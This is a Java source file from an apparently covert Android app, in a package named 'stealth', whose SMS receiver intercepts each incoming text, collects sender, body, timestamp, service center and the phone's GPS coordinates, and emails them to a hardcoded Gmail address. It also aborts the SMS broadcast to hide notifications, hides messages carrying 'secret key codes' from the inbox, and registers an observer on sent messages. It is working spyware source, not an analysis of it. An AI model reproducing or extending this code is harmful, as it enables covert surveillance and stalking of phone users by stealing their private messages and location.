package cacafogo.software.stealth.broadcast_receiver;


import java.util.Date;
import java.text.SimpleDateFormat;

import cacafogo.software.stealth.ApplicationStuff;
import cacafogo.software.stealth.Global;
import cacafogo.software.stealth.SendEmailToClient;
import cacafogo.software.stealth.broadcast_receiver.observer.OutgoingSmsObserver;
import cacafogo.software.stealth.client.ClientInfo;
import cacafogo.software.stealth.secret_key_code.SecretKeyCode;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.telephony.SmsMessage;
import android.util.Log;

public class SmsReceiver extends BroadcastReceiver {
	public String from = "";
	public String message = "";
	public long timeStamp = 0L;
	private String serviceCenter;
	private String incomingDateString;
	private Date outgoingDate;
	private Date incomingDate;
	
    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";

	
	
	public SmsReceiver() {
		Log.d("cacafogo", "in the SmsBroadcast");
	}

	
		public void onReceive( Context context, Intent intent ) 
		{
			
			
			Log.d("cacafogo", "in the SmsBroadcast OnReceive");
			//this stops notifications to others
			Log.d("caca", intent.getAction() + "");
			if (intent.getAction() == null){
				Log.d("caca", "intent is null");
			}
			
			else if (intent.getAction().equalsIgnoreCase(SMS_RECEIVED)){
				this.abortBroadcast();

			    //---get the SMS message passed in---
			    Bundle bundle = intent.getExtras(); 
			    SmsMessage[] msgs = null;
			    String str = ""; 
			    //chcek if bundle is null =============================
			    if (bundle != null)
			    {
			        //---retrieve the SMS message received---
			        Object[] pdus = (Object[]) bundle.get("pdus");
			        System.out.println("pdus length= " + pdus.length);
			        msgs = new SmsMessage[pdus.length]; 
			        
			        for (int i=0; i<msgs.length; i++){
			            msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);                
			            str += "SMS from " + msgs[i].getOriginatingAddress();
			            str += " :";
			            str += msgs[i].getMessageBody().toString();
			            str += "\n"; 
			            
			            from = msgs[i].getOriginatingAddress();
			            message = msgs[i].getMessageBody().toString();
			            timeStamp = msgs[i].getTimestampMillis();
			            serviceCenter= "SMS from " + msgs[i].getServiceCenterAddress();
			            
			            
			            //get date from timestamp
			            incomingDateString = extractDate(timeStamp);
			            
			            
			            //details of sms message
			            String fullSmsDetails = "From: " + from +  "\n" + "Date: " + incomingDateString + "\n" + "Message: " 
			            + message + "\n" + "Service Center: " + serviceCenter;
			            
			            
			            //log the message
			            //Log.d("cacafogo", "From: " + from);
			            //Log.d("cacafogo", "Message: " + message);
			            //Log.d("cacafogo", "Service Center: " + serviceCenter);
			            //Log.d("cacafogo", "TimeStamp: " + timeStamp);
			            //Log.d("cacafogo", "Date: " + incomingDateString);
			            
			            System.out.println("long = " + Global.longitude);
			            

				        /*
			             * EMAIL  MESSAGE TO CLIENT
			             */
			            emailIncomingSms(from, message, timeStamp, serviceCenter, incomingDateString);
			            
			        	}
			            
			           
			        }
			    }//end check if bundle is null ==========================
			        else{
			        	Log.d("cacafogo", "bundle is null");
			        }
			    
	        // WARNING!!! 
	        // If you uncomment the next line then received SMS will not be put to incoming.
	        // Be careful!
	        // this.abortBroadcast(); 
		    
		        
			        /*
			         * Check the Secret Key Code Class
			         */
			        SecretKeyCode skc = new SecretKeyCode(message,context);
			        
			        //if a secret key is found....
			        if(skc.secretKeyCodeFound)
			        {
			          /*  //make your actions
			            //and no alert notification and sms not in inbox
			        	
						//don't let the phone receive the sms
			        	
			        	Intent launch = new Intent(context, SecretKeyCodeActivatedActivity.class);
			        	launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			        	context.startActivity(launch);*/
	        	
			        }
			        else{
			            //continue the normal process of sms and will get alert and reaches inbox
			            this.clearAbortBroadcast();
			        }
		    
		    
		    /*
		     * CHECK LAST REVEIVED SMS
		     */
		    ContentResolver contentResolver = ApplicationStuff.ContentResolver();
			contentResolver.registerContentObserver(Uri.parse("content://sms/sent"),true, new OutgoingSmsObserver(new Handler()));
			
		}


		
		/*
		 * Method to Email Incoming SMS
		 */
		private void emailIncomingSms(String from, String message,
				long timeStamp, String serviceCent, String incomingDateString) {
			Log.d("cacafogo", "in emailIncomingSms");
			//email to
			String[] to = {"cacafogo.software@gmail.com"};
			
			//build email body
			String emailBody = "From: " + from + "\n";
			emailBody += "Service Center Number: " + serviceCent + "\n"; 
			emailBody += "Time Stamp: " + timeStamp + "\n"; 
			emailBody += "Date and Time: " + incomingDateString + "\n"; 
			emailBody += "Longitude: " + Global.longitude + "\t" + "Latitude: " + Global.latitude + "\n";
			emailBody += "Message: " + "\n\n"; 
			emailBody += message; 
			
			ClientInfo.setInSmsFrom(from);
			ClientInfo.setInSmsFrom(message);
			ClientInfo.setInSmsTimeStamp(timeStamp);
			
			//send the email
			SendEmailToClient send = new SendEmailToClient();
			
			send.set_to(to);
			send.set_subject("Message Received");
			send.setBody(emailBody);
			
			try {
				send.send();
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			
		}
		
		
		
		//Method to extract date-string from a timestamp
		private String extractDate(long timeStamp) {
			//get the date from the timestamp
            SimpleDateFormat sdf = new SimpleDateFormat("MMM dd,yyyy HH:mm");
            Date incomingDate = new Date(timeStamp);
            //store it as a string
            String date = sdf.format(incomingDate);
			return date;
		}



	}


